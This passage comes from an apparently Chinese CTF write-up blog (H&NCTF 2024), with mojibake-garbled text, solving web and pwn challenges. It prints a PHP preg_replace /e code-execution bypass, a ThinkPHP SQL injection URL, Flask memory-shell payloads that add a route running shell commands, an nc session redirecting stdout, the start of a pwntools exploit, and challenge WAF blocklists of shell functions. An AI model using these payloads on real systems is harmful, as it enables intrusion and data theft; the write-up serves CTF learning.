class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>è¿™ä¸ªæ˜¯RCEå—ï¼Ÿå®¡ä¸€å®¡ã€‚æˆåŠŸæ‰¾åˆ°äº†æ¼æ´ç‚¹ï¼Œpreg_replace(&quot;/please_give_me_flag/ei&quot;,![](https://www.yuque.com/api/services/graph/generate_redirect/latex?_POST%5B'task'%5D%2C#card=math&amp;code=_POST%5B%27task%27%5D%2C&amp;id=o3Kvv)_POST['flag']);å¯ä»¥çœ‹åˆ°ï¼Œå­˜åœ¨/eæ¨¡å¼ï¼Œå†çœ‹çœ‹PHPç‰ˆæœ¬ï¼Œ5.6.40ï¼Œå¯èƒ½å­˜åœ¨/eçš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚å‰é¢ï¼Œéœ€è¦ç»•çš„Wafç¬¬ä¸€ä¸ªä¸ºï¼š</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |.|include|require|flag/i&#x27;,$str1)</span><br></pre></td></tr></table></figure><pre><code>è¿™ä¸ªç»•è¿‡å…ˆæ”¾æ”¾ï¼Œçœ‹çœ‹åé¢ä¸¤ä¸ªï¼š</code></pre><blockquote><p>strlen(str2) != 19 || preg_match(â€™/please_give_me_flag/â€™,str2)</p></blockquote><pre><code>å› ä¸ºéƒ½æ˜¯é€»è¾‘æˆ–ï¼Œæ‰€ä»¥å¾—è®©ä»–ä»¬éƒ½ä¸ºFalseï¼Œåˆšå¥½ï¼Œplease_give_me_flag é•¿åº¦ä¸º19ï¼Œç¬¬äºŒä¸ªæ­£åˆ™åˆšå¥½æ˜¯å¤§å°å†™æ•æ„Ÿï¼Œæ‰€ä»¥å¤§å°å†™æ··åˆç»•è¿‡ã€‚ç„¶åå°±æ˜¯è¡¥å……ä¸‹å…³äº/eæ¨¡å¼çš„é—®é¢˜ï¼š</code></pre><blockquote><p>preg_replace ä½¿ç”¨äº† /e æ¨¡å¼ï¼Œå¯¼è‡´å¯ä»¥ä»£ç æ‰§è¡Œï¼Œè€Œä¸”è¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªå‚æ•°éƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ preg_replace å‡½æ•°åœ¨åŒ¹é…åˆ°ç¬¦å·æ­£åˆ™çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šå°†æ›¿æ¢å­—ç¬¦ä¸²ï¼ˆä¹Ÿå°±æ˜¯ä¸Šå›¾ preg_replace å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰å½“åšä»£ç æ¥æ‰§è¡Œ</p></blockquote><pre><code>æœ€åå°è¯•ä¸‹phpinfoï¼š</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//POSTä¼ å‚</span><br><span class="line">flag=Please_give_me_flag&amp;task=phpinfo()</span><br></pre></td></tr></table></figure><p><img data-src="https://img-blog.csdnimg.cn/img_convert/5360c207b3d310e77b32d9bc41be09d4.png" alt="Screenshot 2024-05-12 132313.png"></p><pre><code>æˆåŠŸæ‰“å‡ºç»„åˆæ‹³ã€‚å†å›å¤´çœ‹çœ‹ç¬¬ä¸€ä¸ªè¿‡æ»¤ï¼Œçœ‹ä¸Šå»å‡ ä¹æŠŠæ‰€æœ‰çš„shellå‡½æ•°éƒ½è¿‡æ»¤äº†ã€‚æ¨æµ‹flagåœ¨æ ¹ç›®å½•ï¼Œé‚£ä¹ˆå­¦ç€ä½¿ç”¨æ— å‚æ•°RCEçš„æ–¹å¼æ‰“è¿™å¥—ç»„åˆæ‹³ï¼Œpayloadå¦‚ä¸‹ï¼š</code></pre><blockquote><p>flag=Please_give_me_flag&amp;task=chdir(&quot;/&quot;)|highlight_file(scandir(pos(localeconv()))[7])</p></blockquote><p>æœ€åå¾—åˆ° flag</p><p><img data-src="https://img-blog.csdnimg.cn/img_convert/c6799817df231c2c29d719c55eb21a19.png" alt="Screenshot 2024-05-12 132839.png"></p><h2 id="ez_tpå¤ç°"><a class="markdownIt-Anchor" href="#ez_tpå¤ç°">#</a> ez_tpï¼ˆå¤ç°ï¼‰</h2><p>çœ‹èµ·æ¥åƒæ˜¯ thinkphp çš„é¢˜ï¼Œä¸è¿‡ï¼Œæ˜¯éé¢„æœŸçš„é¢˜ï¼Œç”¨å¹³å¸¸çš„ payload ä¸€æŠŠæ¢­æ€•æ˜¯ä¸å¯¹ï¼Œæ‰€ä»¥ï¼Œè¿˜èƒ½æ€ä¹ˆæï¼Ÿä¸‹åœ¨é™„ä»¶ä¸‹æ¥å®¡å®¡å§ã€‚<br>åœ¨é™„ä»¶ /ez_tp/App/Home/Controller ä¸­å­˜åœ¨ IndexController.class.php æ–‡ä»¶ï¼Œæ‰“å¼€çœ‹çœ‹ï¼š<br>è¿™åº”è¯¥æ˜¯ä¸€ä¸ªè·¯ç”±å§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public function h_n()</span><br></pre></td></tr></table></figure><p>è·¯ç”±åº”è¯¥æ˜¯ h_nï¼Œé‚£ä¹ˆï¼Œåº”è¯¥æ€ä¹ˆæ‰“å‘¢ï¼Ÿä¸çŸ¥é“ä¸ºå•¥ï¼Œå¤ç°çš„æ—¶å€™æ—¥å¿—æ‰¾ä¸åˆ°äº†ï¼Œçœ‹ dalao ä»¬çš„ wp çš„æ—¶å€™ï¼Œéƒ½è¯´çš„æ˜¯æ ¹æ®åå°çš„æ—¥å¿—æœ‰ payloadï¼Œä½†æ˜¯ç°åœ¨è·‘å»æ‰¾åˆæ‰¾ä¸åˆ°äº†ã€‚<br>ç»§ç»­å¾€åé¢å®¡è®¡ï¼Œå‘ç°äº†å¦‚ä¸‹ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name = I(<span class="string">&#x27;GET.name&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å¥½ï¼ŒçŸ¥é“äº†éœ€è¦é€šè¿‡ get ä¼ å‚ï¼Œè¿˜æ˜¯ GET ä¼ å‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$pattern = <span class="string">&quot;insert|update|delete|and|or|\/\*|\*|\.\.\/|\.\/|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;</span><br><span class="line">            $pattern.= <span class="string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line">            $pattern.= <span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line">            $pattern.= <span class="string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;</span><br><span class="line">            $vpattern = explode(<span class="string">&quot;|&quot;</span>, $pattern);</span><br><span class="line">            $<span class="built_in">bool</span> = false;</span><br><span class="line">            foreach ($<span class="built_in">input</span> <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                foreach ($vpattern <span class="keyword">as</span> $value) &#123;</span><br><span class="line">                    foreach ($v <span class="keyword">as</span> $kk =&gt; $vv) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/$value/i&quot;</span>, $vv)) &#123;</span><br><span class="line">                            $<span class="built_in">bool</span> = true;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> ($<span class="built_in">bool</span>) <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ($<span class="built_in">bool</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $<span class="built_in">bool</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¤§æ¦‚å®¡ä¸€ä¸‹å°±æ˜¯ï¼Œæ£€æµ‹æ‰€æœ‰çš„é”®å€¼å¯¹ä¸­ï¼Œæ˜¯å¦å­˜åœ¨é»‘åå•å­—æ®µï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°é”®å€¼å¯¹éƒ½ä¸èƒ½å‡ºç°é»‘åå•å­—æ®µï¼Œå› æ­¤ï¼Œæ–‡ä»¶åŒ…å«å’Œ RCE æ²¡æ³•æ‰“ï¼Œå†çœ‹çœ‹ä¸‹é¢çš„è¿™æ®µä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (waf())&#123;</span><br><span class="line">            $this-&gt;index();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $ret = $User-&gt;field(<span class="string">&#x27;username,age&#x27;</span>)-&gt;where(array(<span class="string">&#x27;username&#x27;</span>=&gt;$name))-&gt;select();</span><br><span class="line">            echo var_export($ret, true);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>çŒœæµ‹åº”è¯¥è¿™å„¿åº”è¯¥æœ‰ä¸ª sql æ³¨å…¥å­˜åœ¨ï¼Œå¹¶ä¸”æ²¡æœ‰è¿‡æ»¤ selectï¼Œæ‰€ä»¥ï¼Œæ ¹æ® thinkphp çš„ä»¥å‰çš„ payloadï¼Œä»¥åŠå¤§ä½¬çš„ wp ä¸­è¯´çš„æ—¥å¿—ä¸­çš„ä¿¡æ¯ï¼Œå¯ä»¥å¾—çŸ¥ payload ä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/home/index/h_nï¼Ÿname[<span class="number">0</span>]=exp&amp;name[<span class="number">1</span>]=%3d%27test123%<span class="number">27</span>%20union%20select%<span class="number">201</span>,flag%<span class="number">20</span><span class="keyword">from</span>%20flag</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°äº† flagï¼š array (0 =&gt; array ( â€˜usernameâ€™ =&gt; â€˜1â€™, â€˜ageâ€™ =&gt; â€˜H&amp;NCTF {Cjp_6c3114ee-23e1-459b-ad88-9b29ccfde934}â€™, ), )</p><h2 id="ezflaskå¤ç°"><a class="markdownIt-Anchor" href="#ezflaskå¤ç°">#</a> ezFlaskï¼ˆå¤ç°ï¼‰</h2><p>é¢˜ç›®æ²¡å‡º flaskï¼Œä½†æ˜¯å¥½åœ¨äº†è§£äº†ä¸€ä¸ªæ–°çš„ flask çš„ ssti çš„å§¿åŠ¿ï¼Œè®°å½•åœ¨è¿™å„¿ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œè·Ÿç€ wp å¤ç°ï¼Œå´è¿˜æ˜¯å¤±è´¥äº†ï¼Œå…ˆè®°å½•å§ï¼Œä¹‹åå†æ”¹ã€‚<br>é¦–å…ˆï¼Œæ‰“å¼€ç½‘é¡µå°±ç»™äº†ä¸ªæç¤ºï¼š</p><div class="note info"><p>å†’é™©å³å°†å¼€å§‹ï¼ï¼ï¼ è¯·ç§»æ­¥ / Adventure è·¯ç”±è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåç«¯è¯­å¥ä¸ºï¼š cmd = request.form [â€˜cmdâ€™] eval (cmd) æ³¨æ„ï¼Œä½ ä»…æœ‰ä¸€æ¬¡æœºä¼šï¼Œåœ¨è¿›è¡Œå”¯ä¸€ä¸€æ¬¡æˆåŠŸçš„å‘½ä»¤æ‰§è¡Œåç”Ÿæˆ flag å¹¶å†™å…¥ /flag æ‰§è¡Œæ— å›æ˜¾ï¼Œç›®å½•æ²¡æƒé™éƒ¨åˆ†å‘½ä»¤ banï¼Œä¹Ÿä¸è¦æƒ³ç€å†™æ–‡ä»¶ï½</p></div><h3 id="å¤±è´¥æƒ…å†µ"><a class="markdownIt-Anchor" href="#å¤±è´¥æƒ…å†µ">#</a> å¤±è´¥æƒ…å†µï¼š</h3><p>å¤§æ¦‚è·Ÿä»–æç¤ºçš„ä¸€æ ·ï¼Œå°±æ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œä¸è¿‡æ²¡æ€è·¯ï¼Œå¾ˆå¯æƒœï¼Œçœ‹äº†ä¸‹ wpï¼Œè¯´çš„æ˜¯å†™å…¥å†…å­˜é©¬åˆ°ä¸€ä¸ªè·¯ç”±é‡Œï¼Œä½†æ˜¯æˆ‘å¤ç°å´å¤±è´¥äº†ï¼Œä¸çŸ¥æ˜¯ä¸ºä½•ï¼Œä»–ç»™çš„å†…å­˜é©¬çš„ payload èƒ½æˆåŠŸå†™å…¥ï¼Œå¹¶ä¸”èƒ½è®¿é—®åˆ°å†™å…¥çš„è·¯ç”±ï¼Œä½†æ˜¯ï¼Œå´ä¼šæŠ¥ 500 é”™è¯¯ï¼Œä¸çŸ¥æ˜¯ä¸ºä½•ï¼Œç­‰å®˜æ–¹ wp å‡ºäº†å†çœ‹çœ‹æ˜¯ä¸ºå•¥å§ï¼Œpayload å…ˆå†™åœ¨ä¸‹é¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=render_template_string(<span class="string">&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="æˆåŠŸæƒ…å†µ"><a class="markdownIt-Anchor" href="#æˆåŠŸæƒ…å†µ">#</a> æˆåŠŸæƒ…å†µï¼š</h3><p>æ‰¾åˆ°äº†å¦ä¸€ä¸ª payloadï¼ŒåŒæ ·æ˜¯å†…å­˜é©¬ï¼Œpayload å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=app.add_url_rule(<span class="string">&#x27;/test&#x27;</span>,<span class="string">&#x27;test&#x27;</span>,<span class="keyword">lambda</span>:<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><p>ä¹‹åè®¿é—® /test?cmd=cat+/flag æˆåŠŸå‡º flagï¼šflag {42ae8a8b-4f88-4c45-a162-bd1881da16ea}ã€‚</p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn">#</a> Pwn:</h1><h2 id="close"><a class="markdownIt-Anchor" href="#close">#</a> close</h2><pre><code>é€†å¤©é¢˜ç›®ï¼Œçº¯ç‰›é©¬å‡ºé¢˜äººï¼Œæƒ³æš´æ‰“ã€‚æ‹¿åˆ°é¢˜ç›®ç¬¬ä¸€ä»¶äº‹å„¿æ˜¯æ£€æŸ¥ä¿æŠ¤ï¼Œè¿™ä¸ªé¢˜ä¿æŠ¤ä¹Ÿå°±é‚£æ ·ï¼ŒPIEåŠ NXã€‚</code></pre><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared# checksec pwn</span><br><span class="line">[*] &#x27;/mnt/shared/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><pre><code>åç¼–è¯‘çœ‹çœ‹ï¼š</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the H&amp;NCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*             *****              *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*            *     *             *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*           *  o o  *            *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*          *    v    *           *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*         *  *     *  *          *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*         * * * * * * *          *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*      Do you know close?        *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>è¿™é¢˜ç›®ä»€ä¹ˆç©æ„å„¿ï¼Ÿå…³é—­äº†æ ‡å‡†è¾“å‡ºæµè¿˜ç©å„¿æ¯›çº¿ï¼Ÿç®—äº†ï¼Œè€è€å®å®å¹²å°±å®Œäº†ã€‚ç»è¿‡é•¿æ—¶é—´æŸ¥æ‰¾èµ„æ–™ï¼Œæœ€åæ‰¾åˆ°äº†åšæ³•ã€‚</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="meta"># nc hnctf.imxbt.cn 35345</span></span><br><span class="line">ls</span><br><span class="line">ls: write error: Bad file descriptor</span><br><span class="line">exec <span class="number">1</span>&gt;&amp;<span class="number">0</span></span><br><span class="line">cat flag</span><br><span class="line">H-NCTF&#123;<span class="number">8</span>d409dad<span class="number">-4b</span>2f<span class="number">-4687</span><span class="number">-9f</span>17<span class="number">-8b</span>450a76946c&#125;</span><br></pre></td></tr></table></figure><pre><code>å¿ƒä¸­æš—æš—æš´æ‰“å‡ºé¢˜äººä¸¤åˆ†é’Ÿæ³„æ„¤ã€‚    (*ï¿£ï¸¿ï¿£)</code></pre><h2 id="ez_pwnå¤ç°expæ˜¯å¤§ä½¬çš„æœ‰æ—¶é—´è‡ªå·±å†å†™ä¸ªexp"><a class="markdownIt-Anchor" href="#ez_pwnå¤ç°expæ˜¯å¤§ä½¬çš„æœ‰æ—¶é—´è‡ªå·±å†å†™ä¸ªexp">#</a> ez_pwnï¼ˆå¤ç°ï¼Œexp æ˜¯å¤§ä½¬çš„ï¼Œæœ‰æ—¶é—´è‡ªå·±å†å†™ä¸ª expï¼‰</h2><p>çœ‹åˆ°è¿™ä¸ªé¢˜ï¼Œæˆ‘çªç„¶è§‰å¾—æˆ‘æ˜¯ä¸ªæ‰§æ–ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯å‡ºé¢˜äººæ•…æ„ææˆ‘å¿ƒæ€ï¼Œç»“æœæ˜¯æˆ‘å­¦è‰ºä¸ç²¾çš„ç¼˜æ•…ï¼Œå¥½å§ï¼Œæˆ‘çš„é—®é¢˜ï¼Œæ²¡çœ‹å‡ºæ¥ï¼Œæˆ‘æ‘Šç‰Œäº†ï¼Œæˆ‘æ˜¯ä¸ª XXã€‚<br>å¥½å§ï¼Œè€æ ·å­ï¼ŒUbuntu å¯åŠ¨ï¼ï¼ï¼<br>è¿˜æ˜¯å…ˆæŸ¥çœ‹ä¿æŠ¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="comment"># checksec pwn</span></span><br><span class="line">[*] <span class="string">&#x27;/mnt/shared/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>ç„¶å IDA åç¼–è¯‘ï¼Œæ¼æ´å‡½æ•°ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°äº†ç‚¹ä¸œè¥¿ï¼Œå°±æ˜¯ï¼Œè¿™é‡Œå­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå°±æ˜¯ï¼Œread å‡½æ•°è¯»å–çš„æ•°æ®ä¸º 48 å­—èŠ‚ï¼Œä½†æ˜¯ï¼Œç»è¿‡åŠ¨æ€è°ƒè¯•å¾—å‡ºçš„ç¼“å†²åŒº s çš„å¤§å°ä¸º 44 å­—èŠ‚ï¼Œå¥½å¥½å¥½ï¼ŒIDA ä½ åˆå¾—è®°å¤§è¿‡äº†ã€‚<br>ä¹‹åï¼Œç¬¬ä¸€æ¬¡ä¸éœ€è¦æº¢å‡ºï¼Œå°†ç¼“å†²åŒºå…¨éƒ¨å†™æ»¡å³å¯ï¼Œå› ä¸ºå­˜åœ¨ % s è¿™ä¸ªæ ¼å¼ä¸²é…åˆ printf å‡½æ•°ï¼Œæ‰€ä»¥ï¼Œèƒ½å¤Ÿç›´æ¥æŠŠ rbp çš„å€¼ç»™æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥åªéœ€è¦æ¥æ”¶ä¹‹åï¼Œå°±å¯ä»¥æ‹¿åˆ° rbp çš„å€¼äº†ï¼Œç„¶åï¼Œé€šè¿‡åŠ¨æ€è°ƒè¯•å¾—åˆ°çš„ rbp çš„åœ°å€ä¸ç¼“å†²åŒº buf çš„åœ°å€ï¼Œå°±å¯ä»¥æ‹¿åˆ°å­—ç¬¦ä¸²çš„åœ°å€äº†ã€‚<br><img data-src="https://img-blog.csdnimg.cn/img_convert/274c8e349eb022da9e344e7bc10beaf3.png" alt="Screenshot 2024-05-14 234816.png"><br><img data-src="https://img-blog.csdnimg.cn/img_convert/5b55b3705f40fde32011de08190abef9.png" alt="Screenshot 2024-05-14 234826.png"><br> æ¥æ”¶åˆ°äº† rbp çš„å€¼ä¹‹åï¼Œå‡å» 56 å°±å¯ä»¥å¾—åˆ°å­—ç¬¦ä¸²çš„åœ°å€äº†ã€‚<br>ä¹‹ååˆ™æ˜¯éœ€è¦é€šè¿‡æ ˆè°ƒç”¨ read å‡½æ•°ï¼Œå‘ bss æ®µå†™å…¥ sh;ï¼ˆè¿™é‡Œæˆ‘æ²¡å¼„æ‡‚ä¸ºå•¥ä¸èƒ½ç›´æ¥ä¼  /bin/shï¼Œè€Œæ˜¯è¦ä¼  sh; è¿›å»ï¼‰ï¼Œä¹‹åé‡æ–°è°ƒç”¨ main å‡½æ•°é‡æ–°è¿è¡Œç¨‹åºï¼Œä¸è¿‡ï¼Œåˆ°äº†è¿™é‡Œä¹‹åä¼šå‡ºä¸€ç‚¹é—®é¢˜ï¼Œé‚£å°±æ˜¯ï¼Œç¬¬äºŒæ¬¡è¿›å…¥ main ä¹‹åï¼Œæ ˆçš„å¸ƒå±€ä¼šå‘ç”Ÿå˜åŒ–ï¼Œé‡æ–°è¿›å…¥ vul å‡½æ•°ä¹‹åï¼Œé‡Œé¢çš„æŒ‡é’ˆæŒ‡å‘çš„æ˜¯ vul å‡½æ•°å†…çš„å­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯ä¹‹å‰é‚£ä¸ªï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦é‡æ–°è¿›è¡Œä¸€æ¬¡å­—ç¬¦ä¸²åœ°å€çš„æ³„éœ²ï¼Œä¹‹åæ‰èƒ½å¯¹æ ˆè¿›è¡Œå¸ƒå±€æ¥è°ƒç”¨ system å‡½æ•°ã€‚<br>å¤§ä½¬çš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">IP = <span class="string">&quot;hnctf.yuanshen.life&quot;</span></span><br><span class="line">PORT = <span class="number">33070</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span 